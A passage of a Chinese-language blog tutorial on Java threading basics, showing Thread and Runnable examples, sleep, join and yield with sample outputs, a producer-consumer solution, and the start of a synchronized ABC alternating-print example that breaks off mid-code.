title=\"java线程基础\"></a>java线程基础</h3>","more":"<p><strong>java线程是在一个程序代码中CPU同步运行多个程序片段，而不是一行代码一行代码地执行到底，这样做是为了在运行大程序时提高程序的运行效率。虽然说的是同步运行，其实是“微观串行，宏观并行”，只是线程之间的切换时间太短以至于我们看上去是并行的。另外线程的调度模式有    （1）分时模型   （2）抢占模型</strong><br><strong>java用的是抢占模型，其他知识以后再补充，现在放代码</strong></p>\n<blockquote>\n<p>重要提示：以下的代码的运行结果可能并不能代表多线程真正的运行顺序，因为本身线程运行时输出信号到显示器这段时间也是不可预计的，所以显示器上的显示顺序不完全代表运行代码时间先后。这个问题叫做<code>显示调度器不可预测</code></p>\n</blockquote>\n<p><strong>1. 继承<code>Thread</code>类，重写<code>run</code>函数</strong><br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ThreadTest</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span> <span class=\"params\">(String[] args)</span></span>&#123;</span><br><span class=\"line\">\t\tMyThread thread1 = <span class=\"keyword\">new</span> MyThread(<span class=\"string\">\"thread1\"</span>);</span><br><span class=\"line\">\t\tMyThread thread2 = <span class=\"keyword\">new</span> MyThread(<span class=\"string\">\"thread2\"</span>);</span><br><span class=\"line\">\t\tthread1.start();</span><br><span class=\"line\">\t\tthread2.start();</span><br><span class=\"line\">\t\tSystem.out.println(<span class=\"string\">\"The main runnnig is stopped\"</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">MyThread</span> <span class=\"keyword\">extends</span> <span class=\"title\">Thread</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">MyThread</span><span class=\"params\">(String str)</span></span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">super</span>(str);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;i&lt;<span class=\"number\">3</span>;i++)&#123;</span><br><span class=\"line\">\t\t\tSystem.out.println(getName() + <span class=\"string\">\"is running\"</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">\t\t\t\tsleep(<span class=\"number\">100</span>);</span><br><span class=\"line\">\t\t\t&#125; <span class=\"keyword\">catch</span> (InterruptedException e) &#123;&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\tSystem.out.println(getName() + <span class=\"string\">\"stopped\"</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p><strong>运行结果如下</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">The main runnnig is stopped</span><br><span class=\"line\">thread2is running</span><br><span class=\"line\">thread1is running</span><br><span class=\"line\">thread1is running</span><br><span class=\"line\">thread2is running</span><br><span class=\"line\">thread1is running</span><br><span class=\"line\">thread2is running</span><br><span class=\"line\">thread2stopped</span><br><span class=\"line\">thread1stopped</span><br></pre></td></tr></table></figure></p>\n<p><strong>2. 实现<code>Runable</code>接口</strong></p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">TestSync</span> <span class=\"keyword\">implements</span> <span class=\"title\">Runnable</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> balance;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">50</span>; i++) &#123;</span><br><span class=\"line\">            increament();</span><br><span class=\"line\">            System.out.println(<span class=\"string\">\"balance is \"</span> + balance);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title\">increament</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> i = balance;</span><br><span class=\"line\">        balance = i + <span class=\"number\">1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">TestSyncTest</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        TestSync job = <span class=\"keyword\">new</span> TestSync();</span><br><span class=\"line\">        Thread a = <span class=\"keyword\">new</span> Thread(job);</span><br><span class=\"line\">        Thread b = <span class=\"keyword\">new</span> Thread(job);</span><br><span class=\"line\">        a.start();</span><br><span class=\"line\">        b.start();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"线程调度函数及代码实例\"><a href=\"#线程调度函数及代码实例\" class=\"headerlink\" title=\"线程调度函数及代码实例\"></a>线程调度函数及代码实例</h3><ul>\n<li><code>sleep(long millis)</code> : 在指定的毫秒数内让当前正在执行的线程休眠（暂停执行）</li>\n<li><code>join()</code> : 在很多情况下，主线程生成并起动了子线程，如果子线程里要进行大量的耗时的运算，主线程往往将于子线程之前结束，但是如果主线程处理完其他的事务后，需要用到子线程的处理结果，也就是主线程需要等待子线程执行完成之后再结束，这个时候就要用到join()方法了。</li>\n</ul>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">MyThread</span> <span class=\"keyword\">extends</span> <span class=\"title\">Thread</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">MyThread</span><span class=\"params\">(String name)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">super</span>(name);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> result = <span class=\"number\">0</span>;</span><br><span class=\"line\">        System.out.println(<span class=\"keyword\">this</span>.getName() + <span class=\"string\">\"thread is started!\"</span>);</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">50</span>; i++ ) &#123;</span><br><span class=\"line\">            result += i;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        System.out.println(<span class=\"keyword\">this</span>.getName() + <span class=\"string\">\"thread is stopped!\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ThreadTest</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> InterruptedException </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"Main thread is started!\"</span>);</span><br><span class=\"line\">        MyThread a = <span class=\"keyword\">new</span> MyThread(<span class=\"string\">\"A\"</span>);</span><br><span class=\"line\">        a.start();</span><br><span class=\"line\">        a.join();</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"Main thread is stopped!\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>输出结果:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Main thread is started!</span><br><span class=\"line\">Athread is started!</span><br><span class=\"line\">Athread is stopped!</span><br><span class=\"line\">Main thread is stopped!</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li><code>yield()</code> : <code>运行</code>–&gt;<code>可运行</code>,让当前运行线程回到可运行状态，以允许具有相同优先级的其他线程获得运行机会。因此，使用yield()的目的是让相同优先级的线程之间能适当的轮转执行。但是，实际中无法保证yield()达到让步目的，因为让步的线程还有可能被线程调度程序再次选中。</li>\n</ul>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">MyThread</span> <span class=\"keyword\">extends</span> <span class=\"title\">Thread</span></span><br><span class=\"line\"></span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span></span><br><span class=\"line\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>; i&lt;<span class=\"number\">5</span> ; i++)</span><br><span class=\"line\">            System.out.println(Thread.currentThread().getName()</span><br><span class=\"line\">                    + <span class=\"string\">\" in control\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Driver Class</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ThreadTest</span></span><br><span class=\"line\"></span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[]args)</span></span><br><span class=\"line\">    </span>&#123;</span><br><span class=\"line\">        MyThread t = <span class=\"keyword\">new</span> MyThread();</span><br><span class=\"line\">        t.start();</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>; i&lt;<span class=\"number\">5</span>; i++)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"comment\">// Control passes to child thread</span></span><br><span class=\"line\">            Thread.yield();</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\">// After execution of child Thread</span></span><br><span class=\"line\">            <span class=\"comment\">// main thread takes over</span></span><br><span class=\"line\">            System.out.println(Thread.currentThread().getName()</span><br><span class=\"line\">                    + <span class=\"string\">\" in control\"</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>可能的情况：</p>\n<ul>\n<li>main运行时让掉CPU，过后main抢到CPU继续执行</li>\n<li>main运行时让掉CPU，过后子线程抢到CPU继续执行</li>\n</ul>\n<p>所以输出可能是<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Thread-0 <span class=\"keyword\">in</span> control</span><br><span class=\"line\">main <span class=\"keyword\">in</span> control</span><br><span class=\"line\">main <span class=\"keyword\">in</span> control</span><br><span class=\"line\">main <span class=\"keyword\">in</span> control</span><br><span class=\"line\">main <span class=\"keyword\">in</span> control</span><br><span class=\"line\">main <span class=\"keyword\">in</span> control</span><br><span class=\"line\">Thread-0 <span class=\"keyword\">in</span> control</span><br><span class=\"line\">Thread-0 <span class=\"keyword\">in</span> control</span><br><span class=\"line\">Thread-0 <span class=\"keyword\">in</span> control</span><br><span class=\"line\">Thread-0 <span class=\"keyword\">in</span> control</span><br></pre></td></tr></table></figure></p>\n<p>也可能是<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Thread-0 <span class=\"keyword\">in</span> control</span><br><span class=\"line\">Thread-0 <span class=\"keyword\">in</span> control</span><br><span class=\"line\">Thread-0 <span class=\"keyword\">in</span> control</span><br><span class=\"line\">Thread-0 <span class=\"keyword\">in</span> control</span><br><span class=\"line\">Thread-0 <span class=\"keyword\">in</span> control</span><br><span class=\"line\">main <span class=\"keyword\">in</span> control</span><br><span class=\"line\">main <span class=\"keyword\">in</span> control</span><br><span class=\"line\">main <span class=\"keyword\">in</span> control</span><br><span class=\"line\">main <span class=\"keyword\">in</span> control</span><br><span class=\"line\">main <span class=\"keyword\">in</span> control</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"生产者消费者\"><a href=\"#生产者消费者\" class=\"headerlink\" title=\"生产者消费者\"></a>生产者消费者</h3><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.util.LinkedList;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Queue;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Random;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ProducerCustomer</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String args[])</span> </span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"Solving Producer Consumper Problem\"</span>);</span><br><span class=\"line\">        Queue&lt;Integer&gt; buffer = <span class=\"keyword\">new</span> LinkedList&lt;&gt;();</span><br><span class=\"line\">        <span class=\"keyword\">int</span> maxSize = <span class=\"number\">10</span>;</span><br><span class=\"line\">        Thread producer = <span class=\"keyword\">new</span> Producer(buffer, maxSize, <span class=\"string\">\"PRODUCER\"</span>);</span><br><span class=\"line\">        Thread consumer = <span class=\"keyword\">new</span> Consumer(buffer, maxSize, <span class=\"string\">\"CONSUMER\"</span>);</span><br><span class=\"line\">        producer.start(); consumer.start();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Producer</span> <span class=\"keyword\">extends</span> <span class=\"title\">Thread</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> Queue&lt;Integer&gt; queue;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> maxSize;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">Producer</span><span class=\"params\">(Queue&lt;Integer&gt; queue, <span class=\"keyword\">int</span> maxSize, String name)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">super</span>(name);</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.queue = queue;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.maxSize = maxSize;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span> <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span></span><br><span class=\"line\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (<span class=\"keyword\">true</span>)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">synchronized</span> (queue) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">while</span> (queue.size() == maxSize) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                        System.out .println(<span class=\"string\">\"Queue is full, \"</span> + <span class=\"string\">\"Producer thread waiting for \"</span> + <span class=\"string\">\"consumer to take something from queue\"</span>);</span><br><span class=\"line\">                        queue.wait();</span><br><span class=\"line\">                    &#125; <span class=\"keyword\">catch</span> (Exception ex) &#123;</span><br><span class=\"line\">                        ex.printStackTrace(); &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                Random random = <span class=\"keyword\">new</span> Random();</span><br><span class=\"line\">                <span class=\"keyword\">int</span> i = random.nextInt();</span><br><span class=\"line\">                System.out.println(<span class=\"string\">\"Producing value : \"</span> + i);</span><br><span class=\"line\">                queue.add(i);</span><br><span class=\"line\">                queue.notifyAll();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Consumer</span> <span class=\"keyword\">extends</span> <span class=\"title\">Thread</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> Queue&lt;Integer&gt; queue;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> maxSize;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">Consumer</span><span class=\"params\">(Queue&lt;Integer&gt; queue, <span class=\"keyword\">int</span> maxSize, String name)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">super</span>(name);</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.queue = queue;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.maxSize = maxSize;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span> <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (<span class=\"keyword\">true</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">synchronized</span> (queue) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">while</span> (queue.isEmpty()) &#123;</span><br><span class=\"line\">                    System.out.println(<span class=\"string\">\"Queue is empty,\"</span> + <span class=\"string\">\"Consumer thread is waiting\"</span> + <span class=\"string\">\" for producer thread to put something in queue\"</span>);</span><br><span class=\"line\">                    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                        queue.wait();</span><br><span class=\"line\">                    &#125; <span class=\"keyword\">catch</span> (Exception ex) &#123;</span><br><span class=\"line\">                        ex.printStackTrace();</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                System.out.println(<span class=\"string\">\"Consuming value : \"</span> + queue.remove());</span><br><span class=\"line\">                queue.notifyAll();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"ABC交替打印\"><a href=\"#ABC交替打印\" class=\"headerlink\" title=\"ABC交替打印\"></a>ABC交替打印</h3><h4 id=\"synchronized方式\"><a href=\"#synchronized方式\" class=\"headerlink\" title=\"synchronized方式\"></a>synchronized方式</h4><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ABC_Synch</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ThreadPrinter</span> <span class=\"keyword\">implements</span> <span class=\"title\">Runnable</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">private</span> String name;</span><br><span class=\"line\">        <span class=\"keyword\">private</span> Object prev;</span><br><span class=\"line\">        <span class=\"keyword\">private</span> Object self;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"title\">ThreadPrinter</span><span class=\"params\">(String name, Object prev, Object self)</span> </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">this</span>.name = name;</span><br><span class=\"line\">            <span class=\"keyword\">this</span>.prev = prev;</span><br><span class=\"line\">            <span class=\"keyword\">this</span>.self = self;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">int</span> count = <span class=\"number\">10</span>;</span><br><span class=\"line\">            <span class=\"keyword\">while</span> (count &gt; <span class=\"number\">0</span>) &#123;<span class=\"comment\">// 多线程并发，不能用if，必须使用whil循环</span></span><br><span class=\"line\">                <span class=\"keyword\">synchronized</span> (prev) &#123; <span class=\"comment\">// 先获取 prev 锁</span></span><br><span class=\"line\">                    <span class=\"keyword\">synchronized</span> (self) &#123;<span class=\"comment\">// 再获取 self 锁</span></span><br><span class=\"line\">                        System.out.print(name);<span class=\"comment\">// 打印</span></span><br><span class=\"line\">                        count--;</span><br><span class=\"line\"></span><br><span class=\"line\">                        self.notifyAll();<span class=\"comment\">// 唤醒其他线程竞争self锁，注意此时self锁并未立即释放。</span></span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                    <span class=\"comment\">// 此时执行完self的同步块，这时self锁才释放。</span></span><br><span class=\"line\">                    <span class=\"keyword\">try</span> 